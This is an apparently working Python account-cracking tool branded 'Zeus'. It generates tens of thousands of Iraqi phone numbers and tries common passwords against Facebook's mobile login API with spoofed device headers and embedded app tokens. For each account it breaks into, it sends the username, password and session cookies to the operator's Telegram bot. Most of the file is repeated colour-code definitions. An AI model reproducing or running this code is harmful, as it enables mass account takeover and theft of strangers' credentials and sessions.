#==[MODULE]==#
from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import os
import requests
import random
import uuid
import datetime
from uuid import uuid4
import random , webbrowser
import requests,time,os,random,string;
import os, sys, requests, random, json, time, uuid

from concurrent.futures import ThreadPoolExecutor as r
from datetime import datetime
from requests import get,post
from random import choice,randrange
from threading import Thread
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import os
import requests
import random
import uuid
import datetime
from uuid import uuid4
import random , webbrowser
import requests,time,os,random,string;
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m' #اصفر
#==[CONFIG]==#
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
X = '\033[1;33m' #اصفر
J22='\x1b[38;5;209m'
J21='\x1b[38;5;204m'
J2='\x1b[38;5;203m'
J1='\x1b[38;5;202m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ;  E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
X = '\033[1;33m' #اصفر
J22='\x1b[38;5;209m'
J21='\x1b[38;5;204m'
J2='\x1b[38;5;203m'
J1='\x1b[38;5;202m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ;  E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
B='\x1b[1;37m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي
gg = '\x1b[38;5;208m'
X = '\033[1;33m' #اصفر
J22='\x1b[38;5;209m'
J21='\x1b[38;5;204m'
J2='\x1b[38;5;203m'
J1='\x1b[38;5;202m'
P='\x1b[1;97m'
B='\x1b[1;94m'
O='\x1b[1;96m'
Z='\x1b[1;30m'
X='\x1b[1;33m'
F='\x1b[2;32m'
Z='\x1b[1;31m'
L='\x1b[1;95m'
C='\x1b[2;35m'
A='\x1b[2;39m'
P='\x1b[38;5;231m'
J='\x1b[38;5;208m'
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m'
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
Z = '\033[1;31m'  # أحمر
Y = '\033[1;33m'  # أصفر
F = '\033[2;32m'  # أخضر
A = '\033[2;34m'  # أزرق
C = '\033[2;35m'  # وردي
X = '\033[1;33m'  # أصفر قوي
M = '\x1b[1;37m'  # أبيض
R = '\033[1;31m'  # أحمر قوي
G = '\033[1;32m'  # أخضر قوي
B = '\x1b[38;5;208m'  # برتقالي
bee = "\033[1;38;5;223m"
peach      = "\033[1;38;5;216m" 
la = "\033[1;38;5;183m" 
turquoise  = "\033[1;38;5;80m"   # تركواز
rose  = "\033[1;38;5;211m"  # وردي ناعم
mint   = "\033[1;38;5;121m"  # نعناعي
B = '\x1b[38;5;208m'
a19 = '\x1b[38;5;88m'  # أحمر داكن
a4 = '\x1b[1;33m'  # أصفر
a3 = '\x1b[1;32m'  # أخضر
Z = '\033[1;31m' #احمر
a9 = '\x1b[1;37m'  # أبيض
a4 = '\x1b[1;33m'  # أصفر
a3 = '\x1b[1;32m'  # أخضر

def clear():
            sd= choice([J1,J2,J21,J22,F1,C1,P1,P2])
            sd2= choice([J1,J2,J21,J22,F1,C1,P1,P2])
nnn = random.choice([a1,a2,a3,a4,a5,a14,a18,a20,a21,a22,a23,a26,a27,a37,a38,a40])
print(nnn)
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m' ; 
ge,be,gt,bt=0,0,0,0
P2='\x1b[38;5;190m'
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
L = "\033[1;95m"
J = "\x1b[38;5;208m"
#--------------------------------------------
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m' #اصفر
F = '\033[2;32m'
Z = '\033[1;31m' 
L = "\033[1;95m"  #ارجواني
C = '\033[2;35m' #وردي
A = '\033[2;39m' #ازرق
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m' #وردي
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'

aaa = ["a", "b"]
id, ok, cp, loop = [], 0, 0, 0


user_tok = ""
user_id = ""

headers = {
  'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; RMX3081 Build/RKQ1.211119.001) [FBAN/ViewpointsForAndroid;FBAV/286.0.0.1.109;FBBV/768956344;FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/realme;FBBD/realme;FBDV/RMX3081;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2242};FB_FW/1;]",
  'Accept-Encoding': "gzip",
  'content-type': "application/json;charset=utf-8"
}
ne = random.choice(["\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m"])    
Logo =f"""
{P}●─────━Zeus─────━●
{R}╱╱╭━━━┳━┳━━━┳━╮
{P}╭━┫╭━╮┃━┫╭━╮┃━┫
{R}┃╋┣╯╭╯┣━┣╯╭╯┣━┃
{P}┃╭╯╱┃╭┻━╯╱┃╭┻━╯
{R}╰╯╱╱┃┃╱╱╱╱┃┃
●─────━Zeus─────━●

PY~@R7_36 ~R7Aih1

"""

#==[TELEGRAM SEND]==#
def tg_send(msg, tok, cid):
    try:
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", 
                     data={"chat_id": cid, "text": msg}, timeout=10)
    except:
        pass

#==[MENU]==#
def menu():
    global user_tok, user_id
    
    os.system('clear')
    print(Logo)
    user_id = input(f'\x1b[1;32m'' Id: ''\033[1;31m' )
    user_tok = input(f'\x1b[1;32m'+' Tokin: ''\033[1;31m')
    os.system('clear')
    print(Logo)    
    print(f'\x1b[1;31m[√] Code Iraq (0750,0751,0770,0780,0781)....')
    print(G+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')   
    sim = input(f'\033[1;37m\033[1mChoose: ')
    print(G+'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')    
    for _ in range(44444):  
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        id.append(nmp)
    
    with r(max_workers=30) as am:
        os.system('clear')
        print(Logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [
                ids,
                str(idx),
                '123456'
'password'
 '123456789'
 '12345678'
'12345'
'1234567'
'qwerty'
'abc123'
'111111'
'123123'
'admin'
'letmein'
'welcome'
' monkey'
'dragon'
                
                "zaxozaxo",
                
                '١٢٣٤٥٦٧٨٩'
                '١٢٣٤٥٦٧٨'
                '١٢٣٤٥٦٧'
                '١٢٣١٢٣'
                '07500750'
                '07700770'
                '0751'
                '0780'
                
            ]
            am.submit(crackfree, ids, pwxs)
    
    exit()

def crackfree(ids, pwxs):
    global ok, cp, loop
    ne = random.choice(["\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m"])    
    sys.stdout.write(f'\r\r\r\033[1;37m\033[1m[{M}{ne}Zeus{M}]{a9} [OK:-\033[0;32m\033[1m{ok}\033[1;37m\033[1m] [CP:-{Z}{cp}\033[1;37m\033[1m] [{turquoise}{loop}\x1b[38;5;255m] ')
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()      
            
            if 'session_key' in req:
                uid = req["uid"]
                coki = ';'.join(i['name']+'='+i['value'] for i in req['session_cookies'])
                ok += 1
                
                print(f"\r\r\033[0;32m\033[1m[@R7_36-OK] {uid} | {pw}"  )
                user_msg = f"""
حساب شغال ✅
---------------------------------------------
Email: {uid}
Pass: {pw}
Cookie: {coki}
Url  : https://www.facebook.com/profile.php?id={uid}
---------------------------------------------
py : @R7_36"""
                
                tg_send(user_msg, user_tok, user_id)
                break
                
            elif 'www.facebook.com' in req["error"]["message"]:
                uid = req["error"]["error_data"]["uid"]
                cp += 1
                
                print(f"\r\r\x1b[38;5;208m\033[1m[@R7_36-CP]\033[0;32m\033[1m {uid} | {pw}   ")
                
                user_msg = f"""
                حساب سكيور ❌
---------------------------------------------
UID: {uid}
Pass: {pw}
Url  : https://www.facebook.com/profile.php?id={uid}
---------------------------------------------
py : @R7_36 """
                
                tg_send(user_msg, user_tok, user_id)
                break
            else:
                pass
                
        except requests.exceptions.ConnectionError:
            time.sleep(1)
            pass
    
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",}
    return payload

menu()
#نياج كارلي 